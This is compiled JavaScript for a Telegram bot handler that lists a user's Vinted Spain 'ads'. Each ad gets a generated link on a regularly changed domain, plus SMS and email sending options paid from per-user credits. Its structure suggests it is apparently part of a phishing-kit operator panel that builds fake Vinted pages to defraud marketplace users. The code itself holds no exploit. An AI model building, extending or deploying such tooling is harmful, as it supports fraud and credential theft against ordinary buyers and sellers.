"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.handler = exports.composer = void 0;
const grammy_1 = require("grammy");
const database_1 = require("../../../database");
const moment_1 = __importDefault(require("moment/moment"));
const getFlagEmoji_1 = require("../../../helpers/getFlagEmoji");
exports.composer = new grammy_1.Composer();
exports.composer.callbackQuery('vinted es list', handler);
async function handler(ctx) {
    const ads = await database_1.adsRepository.find({
        relations: { author: true },
        where: {
            service: 'vinted',
            country: 'es',
            delete: false,
            author: {
                tgId: ctx.user.tgId
            }
        },
    });
    ads.slice(ads.length - 20, ads.length);
    if (ads.length === 0) {
        return ctx.reply('У вас 0 обьявлений', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Закрыть", callback_data: 'deleteThisMessage' }]
                ]
            }
        });
    }
    const domen = await database_1.domensRepository.findOne({
        where: {
            active: true,
            service: ads[0].service
        }
    });
    for (const ad of ads) {
        const keyb = [
        // [{text: 'Настройки', callback_data: `settings ad ${ad.id}`}]
        ];
        if (ctx.user.sms > 0) {
            keyb.push([{ text: '📲 SMS', callback_data: `sms ad ${ad.id}` }]);
        }
        if (ctx.user.email > 0) {
            keyb.push([{ text: '💌 EMAIL', callback_data: `email ad ${ad.id}` }]);
        }
        keyb.push([{ text: '⚙ Настройки', callback_data: `settings ad ${ad.id}` }]);
        await ctx.reply(`
🐨 ID объявления: <code>${ad.date}</code>

🌳 <b>Название:</b> <code>${ad.title}</code>
🌳 <b>Цена:</b> <code>${ad.price}</code>
🌳 <b>Платформа: ${ad.service.toUpperCase()} [${ad.country.toUpperCase()} ${(0, getFlagEmoji_1.getFlagEmoji)(ad.country)}]</b>
♻️ <b>Домен сменён ${(0, moment_1.default)(domen.dateChange).fromNow()}</b>
➖➖➖➖➖➖➖
💠 <b>Созданная ссылка:</b> <a href="https://${domen.link}/link/${ad.link}">LINK</a>

`, {
            reply_markup: {
                inline_keyboard: keyb
            }
        });
        await new Promise((resolve) => setTimeout(resolve, 1000 * 0.25));
    }
}
exports.handler = handler;
